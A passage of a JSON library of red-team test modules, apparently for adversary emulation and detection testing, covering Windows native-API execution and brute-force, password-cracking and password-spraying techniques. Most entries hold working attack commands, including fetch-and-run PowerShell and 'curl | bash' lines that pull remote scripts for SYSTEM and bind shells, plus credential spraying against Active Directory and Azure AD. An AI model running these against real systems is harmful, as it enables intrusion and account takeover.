        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed and configured",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "7e2ad0db-1efa-4af2-a77c-bc6e87d7b3f3",
      "module_name": "Curl Insecure Connection from a Pod"
    },
    {
      "index": 674,
      "technique_id": "T1106",
      "technique_name": "Native API",
      "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe \"#{source_file}\"\n%tmp%/T1106.exe\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "source_file",
          "description": "Location of the CSharp source file to compile and execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1106\\src\\CreateProcess.cs"
        },
        {
          "name": "output_file",
          "description": "Location of the payload",
          "type": "path",
          "default_value": "%tmp%\\T1106.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "#{source_file} must exist on system.\n",
          "check_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1106/src/CreateProcess.cs\" -OutFile \"#{source_file}\"\n"
        }
      ],
      "rx_module_id": "99be2089-c52d-4a4a-b5c3-261ee42c8b62",
      "module_name": "Execution through API - CreateProcess"
    },
    {
      "index": 675,
      "technique_id": "T1106",
      "technique_name": "Native API",
      "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ce4e76e6-de70-4392-9efe-b281fc2b4087",
      "module_name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique"
    },
    {
      "index": 676,
      "technique_id": "T1106",
      "technique_name": "Native API",
      "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7ec5b74e-8289-4ff2-a162-b6f286a33abd",
      "module_name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique"
    },
    {
      "index": 677,
      "technique_id": "T1106",
      "technique_name": "Native API",
      "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e1f93a06-1649-4f07-89a8-f57279a7d60e",
      "module_name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique"
    },
    {
      "index": 678,
      "technique_id": "T1106",
      "technique_name": "Native API",
      "description": "Runs shellcode in the current running process via a syscall.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Use syscall to execute the entrypoint of the shellcode\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$PathToRagloxModulesFolder\\T1106\\bin\\x64\\syscall.exe -debug\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ae56083f-28d0-417d-84da-df4242da1f7c",
      "module_name": "Run Shellcode via Syscall in Go"
    },
    {
      "index": 679,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user",
          "description": "Account to bruteforce",
          "type": "string",
          "default_value": "%username%"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "09480053-2f98-4854-be6e-71ae5f672224",
      "module_name": "Brute Force Credentials of single Active Directory domain users via SMB"
    },
    {
      "index": 680,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$passwordList = Get-Content -Path \"#{passwords_path}\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"#{user}\", $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user",
          "description": "Account to bruteforce",
          "type": "string",
          "default_value": "$ENV:USERNAME"
        },
        {
          "name": "passwords_path",
          "description": "List of passwords we will attempt to brute force with",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1110.001\\src\\passwords.txt"
        },
        {
          "name": "domain",
          "description": "Active Directory domain FQDN",
          "type": "string",
          "default_value": "$env:UserDnsDomain"
        },
        {
          "name": "auth",
          "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
          "type": "string",
          "default_value": "NTLM"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c2969434-672b-4ec8-8df0-bbb91f40e250",
      "module_name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)"
    },
    {
      "index": 681,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "username",
          "description": "Account to bruteforce. We encourage users running this raglox to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"",
          "type": "string",
          "default_value": "bruce.wayne@contoso.com"
        },
        {
          "name": "passwords",
          "description": "List of passwords we will attempt to brute force with",
          "type": "string",
          "default_value": "Password1`n1q2w3e4r`nPassword!"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "5a51ef57-299e-4d62-8e11-2d440df55e69",
      "module_name": "Brute Force Credentials of single Azure AD user"
    },
    {
      "index": 682,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "Bruteforce a single user's password from a wordlist\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domaincontroller",
          "description": "Domain controller where test will be run",
          "type": "string",
          "default_value": "$ENV:userdnsdomain"
        },
        {
          "name": "domain",
          "description": "Domain where you will be testing",
          "type": "string",
          "default_value": "$ENV:userdomain"
        }
      ],
      "prerequisites": [
        {
          "description": "kerbrute.exe must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
        },
        {
          "description": "bruteuser.txt must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\bruteuser.txt\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1110.001/src/bruteuser.txt?raw=true\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\bruteuser.txt\"\n"
        }
      ],
      "rx_module_id": "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4",
      "module_name": "Password Brute User using Kerbrute Tool"
    },
    {
      "index": 683,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \"cd /tmp; curl -s #{remote_url} | bash\" art\n",
        "elevation_required": true,
        "cleanup_command": "userdel -fr art\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if running on a Debian based machine.\n",
          "check_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then echo \"Debian\"; else echo \"NOT Debian\"; exit 1; fi\nif grep -Rq \"pam_tally\" /etc/pam.d/*; then echo \"pam_tally configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
          "install_command": "apt update && apt install -y openssl sudo curl\n"
        }
      ],
      "rx_module_id": "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700",
      "module_name": "SUDO Brute Force - Debian"
    },
    {
      "index": 684,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
        "elevation_required": true,
        "cleanup_command": "userdel -fr art\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if running on a Redhat based machine.\n",
          "check_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
          "install_command": "yum update && yum install -y openssl sudo curl\n"
        }
      ],
      "rx_module_id": "4097bc00-5eeb-4d56-aaf9-287d60351d95",
      "module_name": "SUDO Brute Force - Redhat"
    },
    {
      "index": 685,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
        "elevation_required": true,
        "cleanup_command": "rmuser -y art\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1110.001/src/sudo_bruteforce.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if running on a FreeBSD based machine.\n",
          "check_command": "if grep -iq \"FreeBSD\" /etc/os-release; then echo \"FreeBSD\"; else echo \"NOT FreeBSD\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v bash)\" ]; then echo \"bash is installed\"; else echo \"bash is NOT installed\"; exit 1; fi\n",
          "install_command": "pkg update && pkg install -y sudo curl bash\n"
        }
      ],
      "rx_module_id": "abcde488-e083-4ee7-bc85-a5684edd7541",
      "module_name": "SUDO Brute Force - FreeBSD"
    },
    {
      "index": 686,
      "technique_id": "T1110.001",
      "technique_name": "Brute Force: Password Guessing",
      "description": "An adversary may attempt to brute force the password of privilleged account for privilege escalation.\nIn the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "plink_file",
          "description": "Path to Putty",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "lockout_threshold",
          "description": "Specify the account lockout threshold configured on the ESXI management server",
          "type": "string",
          "default_value": "5"
        }
      ],
      "prerequisites": [
        {
          "description": "The plink executable must be found in the ExternalPayloads folder.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5",
      "module_name": "ESXi - Brute Force Until Account Lockout"
    },
    {
      "index": 687,
      "technique_id": "T1110.002",
      "technique_name": "Brute Force: Password Cracking",
      "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cd #{hashcat_exe}\\..\n#{hashcat_exe} -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}",
        "elevation_required": true,
        "cleanup_command": "del \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\hashcat6.7z\" >nul 2>&1\ndel \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\7z1900.exe\" >nul 2>&1\ndel \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\7z\" /Q /S >nul 2>&1\ndel \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\hashcat-unzip\" /Q /S >nul 2>&1"
      },
      "variables": [
        {
          "name": "hashcat_exe",
          "description": "Path to Hashcat executable",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe"
        },
        {
          "name": "input_file_sam",
          "description": "Path to SAM file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1110.002\\src\\sam.txt"
        },
        {
          "name": "input_file_passwords",
          "description": "Path to password list",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1110.002\\src\\password.lst"
        }
      ],
      "prerequisites": [
        {
          "description": "Hashcat must exist on disk at specified location (#{hashcat_exe})",
          "check_command": "if (Test-Path  $(cmd /c echo \"#{hashcat_exe}\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.7-zip.org/a/7z1900.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\7z1900.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\7z1900.exe\" -ArgumentList \"/S /D=PathToRagloxModulesFolder\\..\\ExternalPayloads\\7zi\" -NoNewWindow\nInvoke-WebRequest \"https://hashcat.net/files/hashcat-6.1.1.7z\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\hashcat6.7z\"\nStart-Process cmd.exe -Args  \"/c %temp%\\7z\\7z.exe x %temp%\\hashcat6.7z -aoa -o%temp%\\hashcat-unzip\" -Wait\nNew-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null\nMove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\hashcat-unzip\\hashcat-6.1.1\\*\" $(cmd /c echo #{hashcat_exe}\\..) -Force -ErrorAction Ignore"
        }
      ],
      "rx_module_id": "6d27df5d-69d4-4c91-bc33-5983ffe91692",
      "module_name": "Password Cracking with Hashcat"
    },
    {
      "index": 688,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis raglox attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "password",
          "description": "The password to try for each user in users.txt",
          "type": "string",
          "default_value": "Spring2020"
        }
      ],
      "prerequisites": [
        {
          "description": "List of domain users to password spray must exits at %temp%\\users.txt\n",
          "check_command": "if not exist %temp%\\users.txt (exit /b 1)\n",
          "install_command": "\"PathToRagloxModulesFolder\\T1110.003\\src\\parse_net_users.bat\"\n"
        }
      ],
      "rx_module_id": "90bc2e54-6c84-47a5-9439-0a2a92b4b175",
      "module_name": "Password Spray all Domain Users"
    },
    {
      "index": 689,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Domain to brute force against",
          "type": "string",
          "default_value": "$Env:USERDOMAIN"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "263ae743-515f-4786-ac7d-41ef3a0d4b2b",
      "module_name": "Password Spray (DomainPasswordSpray)"
    },
    {
      "index": 690,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "password",
          "description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
          "type": "string",
          "default_value": "P@ssw0rd!"
        },
        {
          "name": "domain",
          "description": "Domain FQDN",
          "type": "string",
          "default_value": "$env:UserDnsDomain"
        },
        {
          "name": "auth",
          "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
          "type": "string",
          "default_value": "NTLM"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f14d956a-5b6e-4a93-847f-0c415142f07d",
      "module_name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)"
    },
    {
      "index": 691,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "password",
          "description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
          "type": "string",
          "default_value": "P@ssw0rd!"
        },
        {
          "name": "valid_username",
          "description": "Valid username to retrieve Azure AD users. We encourage users running this raglox to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>",
          "type": "string",
          "default_value": "bruce.wayne@contoso.com"
        },
        {
          "name": "valid_password",
          "description": "Valid password to authenticate as valid_username in the <valid_ms_account>",
          "type": "string",
          "default_value": "iamthebatman"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a",
      "module_name": "Password spray all Azure AD users with a single password"
    },
    {
      "index": 692,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
